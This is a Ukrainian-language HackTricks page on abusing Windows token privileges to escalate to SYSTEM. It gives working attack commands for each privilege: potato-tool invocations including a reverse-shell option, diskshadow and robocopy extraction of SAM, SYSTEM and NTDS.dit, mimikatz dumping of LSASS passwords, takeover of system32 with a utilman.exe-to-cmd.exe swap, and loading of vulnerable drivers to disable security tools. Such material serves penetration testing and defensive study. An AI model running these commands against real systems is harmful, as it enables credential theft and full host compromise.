# Зловживання токенами

{{#include ../../banners/hacktricks-training.md}}

## Токени

Якщо ви **не знаєте, що таке Windows Access Tokens**, прочитайте цю сторінку, перш ніж продовжувати:


{{#ref}}
access-tokens.md
{{#endref}}

**Можливо, ви зможете підвищити привілеї, зловживаючи токенами, які вже маєте.**

### SeImpersonatePrivilege

Цей привілей дає процесу змогу уособлювати (але не створювати) токен, якщо він може отримати дескриптор цього токена. Привілейований токен можна отримати від Windows-сервісу (DCOM), спонукавши його виконати NTLM-автентифікацію проти експлойта, що згодом дає змогу запустити процес із привілеями SYSTEM.<sup>[[2]](#references)</sup> Цей примітив можна експлуатувати за допомогою таких інструментів, як [JuicyPotato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (для якого потрібно вимкнути WinRM), [SweetPotato](https://github.com/CCob/SweetPotato) і [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Вебзастосунок, доступний лише через loopback, може стати окремою зачіпкою для примусу до автентифікації, якщо локальний користувач може звернутися до автентифікованої кінцевої точки, яка надсилає запит на URL, вибраний користувачем, від імені привілейованішої ідентичності. Перевірте авторизацію кінцевої точки та обмеження URL, фактичну ідентичність клієнта під час вихідного з’єднання й особливості його автентифікації, а також те, чи може цей клієнт з’єднатися зі слухачем, контрольованим користувачем із нижчими привілеями. Самі по собі ввімкнений `SeImpersonatePrivilege`, слухач IIS або параметр для отримання URL не підтверджують наявності привілейованого токена чи шляху підвищення привілеїв. Під час розвідки обмежтеся пасивною перевіркою; не надсилайте запити для примусу до автентифікації. Дивіться документацію Microsoft про [уособлення клієнта](https://learn.microsoft.com/en-us/windows/win32/secauthz/client-impersonation) і [ідентичність пулу застосунків IIS](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities).

Сучасні нотатки для операторів:

- **JuicyPotato — застарілий інструмент**: у Windows 10 1809+/Server 2019+ віддавайте перевагу **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** або **PrintSpoofer** — залежно від того, яка поверхня RPC/COM іще доступна.
- Якщо ви скомпрометували сервіс, що працює як **`LOCAL SERVICE`** або **`NETWORK SERVICE`**, а `whoami /priv` показує **відфільтрований токен** без `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, спершу відновіть **набір привілеїв облікового запису за замовчуванням** (наприклад, за допомогою **FullPowers**), а потім повторно спробуйте інструменти сімейства potato.<sup>[[3]](#references)</sup>
- Деякі новіші форки зручніші для операторів, ніж оригінальні інструменти. Наприклад, **SigmaPotato** підтримує виконання через reflection/у пам’яті та сумісність із сучасними версіями Windows, а **PrintNotifyPotato** зловживає COM-сервісом PrintNotify і часто стає в пригоді, коли класичний шлях через Spooler вимкнено.

```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Це дуже схоже на **SeImpersonatePrivilege**: використовується **той самий метод**, щоб отримати привілейований токен.\
Потім цей привілей дозволяє **призначити первинний токен** новому або призупиненому процесу. За допомогою привілейованого токена імперсонізації можна створити первинний токен (DuplicateTokenEx).\
Маючи токен, можна створити **новий процес** за допомогою 'CreateProcessAsUser' або створити призупинений процес і **встановити токен** (зазвичай первинний токен запущеного процесу змінити не можна).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

Якщо цей токен увімкнено, можна використовувати **KERB_S4U_LOGON**, щоб отримати **токен імперсонізації** будь-якого іншого користувача без знання облікових даних, **додати до токена довільну групу** (адміністраторів), установити для токена **рівень цілісності** "**середній**" і призначити цей токен **поточному потоку** (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Цей привілей змушує систему **надавати повний доступ на читання** до будь-якого файлу (лише для операцій читання). Його використовують, щоб **читати хеші паролів локальних облікових записів Administrator** із реєстру, після чого хеш можна використовувати з такими інструментами, як "**psexec**" або "**wmiexec**" (техніка Pass-the-Hash). Однак ця техніка не працює за двох умов: якщо обліковий запис Local Administrator вимкнено або якщо політика забороняє адміністративні права для підключень Local Administrator віддалено.<sup>[[2]](#references)</sup>\
На практиці найнадійніший вбудований спосіб зазвичай — **VSS + `robocopy /b`**: створити або відкрити тіньову копію, а потім скопіювати `SAM`/`SYSTEM` або `NTDS.dit` у **режимі резервного копіювання**, який обходить ACL файлів.<sup>[[4]](#references)</sup>

```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```

Ви можете **зловживати цим привілеєм** за допомогою:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- переглянувши відео **IppSec**: [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- або так, як описано в розділі **підвищення привілеїв за допомогою Backup Operators**:

{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Цей привілей надає **доступ на запис** до будь-якого системного файлу незалежно від його списку контролю доступу (ACL). Він відкриває численні можливості для підвищення привілеїв, зокрема **модифікацію служб**, DLL Hijacking і налаштування **debuggers** через Image File Execution Options, а також застосування багатьох інших технік.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege — це потужний дозвіл, особливо корисний, коли користувач може імперсонувати токени, але також і за відсутності SeImpersonatePrivilege. Ця можливість залежить від здатності імперсонувати токен, що представляє того самого користувача та має рівень цілісності не вищий за рівень цілісності поточного процесу.<sup>[[2]](#references)</sup>

**Ключові моменти:**

- **Імперсонація без SeImpersonatePrivilege:** За певних умов SeCreateTokenPrivilege можна використати для EoP шляхом імперсонації токенів.
- **Умови імперсонації токена:** Для успішної імперсонації цільовий токен має належати тому самому користувачу, а його рівень цілісності має бути не вищим за рівень цілісності процесу, який виконує імперсонацію.
- **Створення та модифікація токенів імперсонації:** Користувачі можуть створити токен імперсонації та розширити його можливості, додавши SID (ідентифікатор безпеки) привілейованої групи.

### SeLoadDriverPrivilege

Цей привілей дає змогу процесу **завантажувати та вивантажувати драйвери пристроїв**, створивши запис реєстру з певними значеннями `ImagePath` і `Type`. Оскільки прямий доступ на запис до `HKLM` (HKEY_LOCAL_MACHINE) обмежений, натомість можна використовувати `HKCU` (HKEY_CURRENT_USER). Однак потрібен певний шлях, щоб ядро розпізнало запис `HKCU` як конфігурацію драйвера.<sup>[[2]](#references)</sup>

У сучасних атаках зазвичай використовують **BYOVD** (bring your own vulnerable driver): завантажують **підписаний, але вразливий** драйвер ядра, а потім використовують його IOCTL, щоб вимкнути засоби захисту або перейти до виконання коду в ядрі. Зверніть увагу, що в новіших збірках Windows 11/Server **список блокування вразливих драйверів Microsoft** та/або **HVCI/Memory Integrity** часто блокують старі публічні ланцюжки атак. Тому класичні приклади на кшталт `szkg64.sys` більше не є універсально надійними.

Шлях має такий вигляд: `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, де `<RID>` — це Relative Identifier поточного користувача. У `HKCU` потрібно створити весь цей шлях і задати два значення:<sup>[[2]](#references)</sup>

- `ImagePath` — шлях до виконуваного бінарного файлу
- `Type` зі значенням `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Послідовність дій:**

1. Через обмежений доступ на запис використовуйте `HKCU` замість `HKLM`.
2. У `HKCU` створіть шлях `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, де `<RID>` — Relative Identifier поточного користувача.
3. Укажіть шлях до виконуваного бінарного файлу в `ImagePath`.
4. Призначте `Type` значення `SERVICE_KERNEL_DRIVER` (`0x00000001`).

```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```

Більше способів зловживання цією привілеєю описано в [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Ця привілея схожа на **SeRestorePrivilege**. Її основна функція дає процесу змогу **стати власником об’єкта**, обходячи вимогу явного дискреційного доступу завдяки наданню прав доступу WRITE_OWNER. Спочатку процес отримує права власника потрібного ключа реєстру, щоб мати змогу його змінювати, а потім змінює DACL, дозволяючи операції запису.<sup>[[2]](#references)</sup>

```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```

### SeDebugPrivilege

Цей привілей дозволяє **налагоджувати інші процеси**, зокрема читати й записувати дані в пам’ять. За наявності цього привілею можна застосовувати різні стратегії memory injection, здатні обходити більшість антивірусних рішень і систем запобігання вторгненням на хост.<sup>[[2]](#references)</sup>

У сучасних версіях Windows пам’ятайте, що `SeDebugPrivilege` зазвичай достатньо, щоб відкрити **незахищені процеси SYSTEM** і скопіювати їхні токени, але це **не** гарантує, що ви зможете взаємодіяти з **LSASS**. Якщо ввімкнено **RunAsPPL / LSA Protection**, незахищені процеси не можуть читати дані LSASS або впроваджувати в нього код, навіть за наявності `SeDebugPrivilege`. У такому разі викрадіть токен з іншого процесу SYSTEM, який не захищений PPL, або поєднайте це з PPL bypass/BYOVD, а не розраховуйте, що `procdump` спрацює. Приклад повного копіювання токена за допомогою `SeDebugPrivilege` + `SeImpersonatePrivilege` наведено на [цій сторінці](sedebug-+-seimpersonate-copy-token.md).

#### Дамп пам’яті

Для **знімання дампа пам’яті процесу** можна скористатися [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) з [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite). Це, зокрема, стосується процесу **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, який відповідає за зберігання облікових даних користувача після успішного входу в систему.

Потім цей дамп можна завантажити в mimikatz, щоб отримати паролі:

```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

Раніше збережений читабельний дамп LSASS може бути доступним, навіть якщо поточний обліковий запис не має дозволу знімати дамп із захищеного процесу в реальному часі. Розглядайте файл дампа або архів із подібною назвою лише як підказку: перевірте доступ і вміст, а потім з’ясуйте, чи залишаються дійсними будь-які отримані облікові дані та чи надають вони контекст із вищими привілеями. Самі лише назви файлів не доводять, що архів містить дамп або що облікові дані можна повторно використати.

#### RCE

Щоб отримати shell `NT SYSTEM`, можна скористатися:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)

```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```

### SeManageVolumePrivilege

Це право (виконання завдань з обслуговування томів) може дозволяти привілейовані операції з томами, але саме по собі не гарантує доступу до дескриптора необробленого тому для читання чи довільного доступу до файлів. Важливі також ACL пристрою, стан токена, версія Windows і запитувана операція. Дозволена операція керування томом може натомість змінити ACL файлової системи; це операція зі зміною даних, яка потенційно впливає на весь том. На хості CA зловживання сертифікатами також потребує доступу до придатного до використання матеріалу приватного ключа, а для доступу до файлів, захищених EFS, усе ще потрібен авторизований ключ розшифрування або відновлення. Див. докладні передумови нижче.<sup>[[5]](#references)</sup>

Див. докладні методи та способи пом’якшення ризиків:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Перевірка привілеїв

```
whoami /priv
```

Токени, які відображаються як вимкнені, зазвичай можна ввімкнути, тож часто можна скористатися як _увімкненими_, так і _вимкненими_ привілеями.

### Увімкнення всіх токенів

Якщо у вас є вимкнені привілеї, ви можете скористатися скриптом [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1), щоб увімкнути всі токени:

```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```

Або **скрипт**, вбудований у цей [**пост**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Table

Повна шпаргалка щодо привілеїв токенів доступна за адресою [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin); у наведеному нижче підсумку перелічено лише прямі способи використати привілей, щоб отримати сеанс адміністратора або прочитати конфіденційні файли.<sup>[[1]](#references)</sup>

| Привілей                  | Вплив      | Інструмент             | Шлях виконання                                                                                                                                                                                                                                                                                                                                     | Примітки                                                                                                                                                                                                                                                                                                                        |
| ------------------------- | ---------- | ---------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Адміністратор**_ | сторонній інструмент   | _"Він дає користувачу змогу імперсонувати токени й підвищити привілеї до nt system за допомогою таких інструментів, як potato.exe, rottenpotato.exe та juicypotato.exe"_                                                                                                                                                                               | Дякую [Aurélien Chalot](https://twitter.com/Defte_) за оновлення. Незабаром спробую переписати це у вигляді інструкції з конкретними кроками.                                                                                                                                                                                         |
| **`SeBackup`**             | **Загроза** | _**Вбудовані команди**_ | Читання конфіденційних файлів за допомогою `robocopy /b` або спеціальних засобів копіювання, що підтримують SeBackup.                                                                                                                                                                                                                               | <p>- Добре підходить для `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, а іноді й `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` зручний, але спеціалізовані cmdlets/API SeBackup часто гнучкіші для копіювання заблокованих або відкритих файлів.</p>                                                                                           |
| **`SeCreateToken`**        | _**Адміністратор**_ | сторонній інструмент   | Створення довільного токена, зокрема з правами локального адміністратора, за допомогою `NtCreateToken`.                                                                                                                                                                                                                                             |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Адміністратор**_ | **PowerShell**         | Дублювання токена SYSTEM процесу, що не є **PPL**, або дамп пам’яті незахищеного процесу.                                                                                                                                                                                                                                                            | <p>Створення дампа LSASS зазвичай блокується, якщо ввімкнено RunAsPPL/LSA Protection.</p><p>Скрипт можна знайти на [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Адміністратор**_ | сторонній інструмент   | Використання **сімейства Potato** / імперсонації через named pipe для запуску SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato` тощо).                                                                                                                                                                           | <p>Найпрактичніше використовувати з облікових записів служб, таких як IIS APPPOOL, MSSQL, заплановані завдання або будь-який контекст, якому вже надано `SeImpersonatePrivilege`.</p>                                                                                                                                               |
| **`SeLoadDriver`**         | _**Адміністратор**_ | сторонній інструмент   | <p>1. Завантажити підписаний, але вразливий драйвер ядра (BYOVD)<br>2. Використати IOCTL драйвера для читання/запису в ядрі, вимкнення засобів безпеки або підвищення привілеїв до SYSTEM<br><br>Також цей привілей можна використати для вивантаження драйверів, пов’язаних із безпекою, за допомогою вбудованої команди <code>fltMC</code>, наприклад <code>fltMC sysmondrv</code></p> | <p>Старіші загальнодоступні драйвери, як-от <code>szkg64.sys</code>, дедалі частіше блокуються в сучасних версіях Windows списком заблокованих вразливих драйверів / HVCI.</p>                                                                                                                                                         |
| **`SeRestore`**            | _**Адміністратор**_ | **PowerShell**         | <p>1. Запустити PowerShell/ISE із наявним привілеєм SeRestore.<br>2. Увімкнути привілей за допомогою <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Перейменувати utilman.exe на utilman.old<br>4. Перейменувати cmd.exe на utilman.exe<br>5. Заблокувати консоль і натиснути Win+U</p> | <p>Деякі антивірусні програми можуть виявити атаку.</p><p>Альтернативний метод передбачає заміну двійкових файлів служб, що зберігаються в "Program Files", за допомогою того самого привілею</p>                                                                                                                                  |
| **`SeTakeOwnership`**      | _**Адміністратор**_ | _**Вбудовані команди**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Перейменувати cmd.exe на utilman.exe<br>4. Заблокувати консоль і натиснути Win+U</p>                                                                                                                                 | <p>Деякі антивірусні програми можуть виявити атаку.</p><p>Альтернативний метод передбачає заміну двійкових файлів служб, що зберігаються в "Program Files", за допомогою того самого привілею.</p>                                                                                                                                  |
| **`SeTcb`**                | _**Адміністратор**_ | сторонній інструмент   | <p>Маніпулювання токенами, щоб вони містили права локального адміністратора. Може знадобитися SeImpersonate.</p><p>Потребує перевірки.</p>                                                                                                                                                                                                           |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin — шляхи експлуатації від привілеїв Windows до прав адміністратора](https://github.com/gtworek/Priv2Admin)
- [2] [Зловживання привілеями токенів для LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n — Поверніть мені мої привілеї! Будь ласка?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft — Robocopy (режим резервного копіювання `/b` обходить перевірки ACL файлів/папок)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft — Виконання завдань обслуговування томів (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf — HTB: Certificate (SeManageVolumePrivilege → викрадення ключа CA → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
